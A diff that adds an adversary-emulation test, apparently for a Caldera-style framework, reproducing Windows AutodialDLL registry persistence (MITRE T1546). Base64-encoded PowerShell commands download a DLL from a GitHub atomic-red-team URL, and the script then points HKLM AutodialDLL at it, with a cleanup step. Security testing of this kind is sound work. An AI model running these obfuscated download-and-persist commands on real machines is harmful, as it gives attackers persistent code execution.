@@ -1,0 +1,21 @@
+- id: 3f4993f1-a868-51f0-8f5d-2eb29fd01b83
+  name: Soumaia ART Tests - Persistence with Custom AutodialDLL
+  description: "The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. \n\nThe sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.\n[Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/) (requires elevation)"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546
+    name: Event Triggered Execution
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAC4AXABBAGwAdABXAGkAbgBTAG8AYwBrADIARABMAEwALgBkAGwAbAApACAAewAgAGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewAgAGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABiAGkAbgAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABpAGcAbgBvAHIAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADQANgAvAGIAaQBuAC8AQQBsAHQAVwBpAG4AUwBvAGMAawAyAEQATABMAC4AZABsAGwAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAEEAbAB0AFcAaQBuAFMAbwBjAGsAMgBEAEwATAAuAGQAbABsACIACgA=
+          }
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value .\AltWinSock2DLL.dll
+        cleanup: |-
+          Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
+        payloads:
+        - AltWinSock2DLL.dll
+        - bin
